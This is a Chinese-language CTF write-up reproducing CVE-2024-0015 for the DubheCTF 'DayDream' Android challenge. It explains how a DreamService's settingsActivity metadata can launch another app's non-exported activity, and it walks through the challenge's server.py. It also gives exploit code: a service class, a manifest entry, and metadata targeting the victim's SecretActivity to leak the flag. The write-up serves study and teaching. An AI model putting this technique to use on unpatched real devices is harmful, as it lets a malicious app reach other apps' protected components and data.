
# [原创]CVE-2024-0015复现 (DubheCTF DayDream)

# 相关信息说明

## 前言

DayDream是DubheCTF的一个AndroidPwn题，有一说一见到这个题我是真的非常开心（虽然比赛时候在搞其他，就简单看了几眼），当时就立了flag一定要复现这个题，所以文章就来了。

## DayDream

- 简单说一下，DayDream这个模块是关于android的屏保，下面是google的开发文档

> [文档链接](https://bbs.kanxue.com/elink@838K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3X3g2S2L8X3c8J5L8$3W2V1i4K6u0W2j5$3!0E0i4K6u0r3M7X3g2X3k6i4u0W2L8X3y4W2i4K6u0r3j5h3&6V1M7X3!0A6k6q4)9J5c8Y4y4W2M7Y4k6A6j5$3g2Q4x3V1k6V1M7X3g2S2L8i4y4Q4x3V1k6p5M7X3g2S2L8g2y4W2M7Y4k6A6j5$3f1`.)

- 通过文档可以知道：我们能够写一个service继承自`DreamService`，实现自定义的android屏保，就像下面这样进行选择

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_G5RNZFBKJX9UYQY.webp)

- 欸，大家可能注意到了，这个屏保选择旁边的设置按钮是什么呢？

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_BZ22NC5QEBQA5V2.webp)

- 嗷，文档说了，如果我们设置了`meta-data`，就会出现按钮，点击按钮就会跳转到我们设置的`Activity`

- 是随便跳吗？这个时候我们的漏洞就来了

## CVE-2024-0015

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_3PHTR5CATZU3ZN2.webp)

> [补丁链接](https://bbs.kanxue.com/elink@6fbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0W2k6$3!0G2k6$3I4W2M7$3!0#2M7X3y4W2i4K6u0W2j5$3!0E0i4K6u0r3M7r3I4S2N6r3k6G2M7X3#2Q4x3V1k6X3M7X3q4E0k6i4N6G2M7X3E0K6i4K6u0r3j5X3q4K6k6g2)9J5c8W2)9J5b7W2)9J5c8U0u0U0k6e0q4T1y4$3k6V1x3K6M7J5y4K6y4W2j5e0p5&6k6X3u0T1j5U0k6V1j5h3g2W2j5h3p5$3x3U0p5J5x3K6f1%4j5U0W2S2y4K6m8Q4x3U0f1#2c8g2)9J5y4e0t1I4i4K6u0r3i4K6t1K6c8U0p5`.)

- 这是当时比赛的hint链接，也是我们的漏洞补丁信息，其实官方已经说的很清楚了

> Fix vulnerability that allowed attackers to start arbitary activities

- 漏洞的效果就是能够造成任意的`activity`调用

为什么会这样呢？

- 上面提到了，官方提供了一个能够调用`activity`的设置按钮。却忘记了对被调用`activity`进行验证，导致就算是其他app未导出`exported=false`的`activity`也能够被调用执行.

- 一边猛加补丁，一边猛删接口hhh

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_6DFRHQHAPSFTD8K.webp)

Then

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_9KBWPKDNJQA2BWF.webp)

- 在diff中可以看到上述注释，补丁做了一件事情，确保被调用的组件和使用`DreamService`的是属于同一个apk

- OK，漏洞就说到这里，接下来我们去到比赛题目

# 赛题处理

## jadx打开，一共有三部分

- `MainActivity`，没什么信息

- `FlagReceiver`，提供了一个能够接收flag的广播

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_C2495XNVJPHGS4B.webp)

- `SecretActivity`，提供了一个`readFile`能够获取flag

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_7DAG82D2XUHD6PH.webp)

- 很明显，只要调用了`SecretActivity`，就可以得到flag。再结合上面对于CVE的说明，答案已经呼之欲出了

不过不急，我们再看看`server.py`，这个文件也是在给我们提示怎么做

## server.py解读

> 由于我是环境关了以后复现，题目docker又缺文件，然后我改`server.py`又发现模拟器莫名跑不起来。最后索性找了个android12的模拟器敲命令，唉

```python
print\_to\_user("Welcome to DubheCTF2024 DayDream! Please proof of work to continue.\n")
# sha256的爆破，忘了哪个比赛放pwntools爆破的github链接来着emmm
if not proof\_of\_work():
print\_to\_user("Please proof of work again, exit...\n")
exit(-1)
# 输入一个apk url，对于没接触过android的人来说可能不知道这是干什么
# 因为android安全中经常做的事情就是写一个AttackApk去攻击目标apk
# 所以这里需要你写的AttackApk的公网下载链接
print\_to\_user("Please enter your apk url:")
url = sys.stdin.readline().strip()
EXP\_FILE = download\_file(url)
# 校验下载的apk
if not check\_apk(EXP\_FILE):
print\_to\_user("Invalid apk file.\n")
exit(-1)
# 启动模拟器
emulator = setup\_emulator()
adb(["wait-for-device"])
wait\_for\_device\_boot\_complete()
# 直接给你ban咯，readme.md里有说，不过提了一嘴parcel序列化让我想起了2017的那几个洞
adb(["shell", "su", "root", "pm", "disable", "com.android.settings/.accounts.AddAccountSettings"])
# 安装目标apk
adb\_install(APK\_FILE)
# 启动目标apk
adb\_activity(f"{VICTIM}/.MainActivity", wait=True)
# 使用广播将flag文件写入模拟器环境
with open(FLAG\_FILE, "r") as f:
adb\_broadcast(f"com.tsctf.SET\_FLAG", f"{VICTIM}/.FlagReceiver", extras={"flag": f.read()})
# 安装攻击apk
adb\_install(EXP\_FILE)
# 启动攻击apk
adb\_activity(f"{ATTACKER}/.MainActivity")
# 攻击
one\_click()
print\_to\_user("One\_click finished! The logcat log will be output after 5 seconds.\n")
# 将SecretActivity的日志打印出来，如果SecretActivity被调用了，这里就会输出flag
adb(["shell","logcat -d -s SecretActivity", ">" ,"/logcat\_"+ str(ADB\_PORT) + ".txt"])
```

流程还是很正常的，关键就是`one_click`了

```python
def one\_click():
# 打开屏保设置页面
adb(["shell", "am", "start", "-a", "android.settings.DREAM\_SETTINGS"])
adb(["shell", "sleep", "10"])
# 向下滑（排除误差哈哈哈）
adb(["shell", "input", "keyevent", "KEYCODE\_DPAD\_DOWN"])
adb(["shell", "sleep", "1"])
# 回车，这里就是选择屏保样式
adb(["shell", "input", "keyevent", "KEYCODE\_ENTER"])
adb(["shell", "sleep", "5"])
# 点击对应的选项，这里就是在选择我们编写的屏保部分
adb(["shell", "input", "tap", "675", "1415"])
adb(["shell", "sleep", "5"])
# 点击那个最最最关键的设置按钮
adb(["shell", "input", "tap", "1256", "842"])
adb(["shell", "sleep", "1"])
```

OK，接下来我们要做的事情就是写一个apk，然后调用`SecretActivity`了，具体怎么写可以看上面的Dream Service 官方文档

## EXP

> 需要注意的是题目明确了包名

- `DreamService`

```java
package com.tsctf.daydream;
import android.service.dreams.DreamService;
public class MyService extends DreamService {
@Override
public void onAttachedToWindow() {
super.onAttachedToWindow();
// Exit dream upon user touch
setInteractive(false);
// Hide system UI
setFullscreen(true);
// Set the dream layout
}
}
```

- `androidmanifest.xml`声明service（需要注意的是官方说了高API要申请权限）

```xml
<service
android:name=".MyService"
android:label="Test"
android:enabled="true"
android:exported="true"
android:permission="android.permission.BIND\_DREAM\_SERVICE">
<intent-filter>
<action android:name="android.service.dreams.DreamService" />
<category android:name="android.intent.category.DEFAULT" />
</intent-filter>
<meta-data
android:name="android.service.dream"
android:resource="@xml/test\_dream\_metadata" />
</service>
```

- 核心的activity调用

```java
<?xml version="1.0" encoding="utf-8"?>
<dream xmlns:android="http://schemas.android.com/apk/res/android"
android:settingsActivity="com.tsctf.victimapp/.SecretActivity"/>
```

## 执行效果

> 用户名联想是历史遗留问题:(

![图片描述](https://bbs.kanxue.com/upload/attach/202403/996447_UEA4JSNCYJBEKMV.webp)

> 附件是复现视频，logcat里有那么多条是因为尝试了不止一次:(

最后附上源码地址：

> [源码地址](https://bbs.kanxue.com/elink@da9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6g2L8g2k6X3h3o6q4n7N6X3q4i4y4e0m8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6t1@1i4K6u0V1x3o6l9I4y4b7`.`.)

好了，可以下机了，如果有什么不对的地方欢迎师傅们来拷打~~~
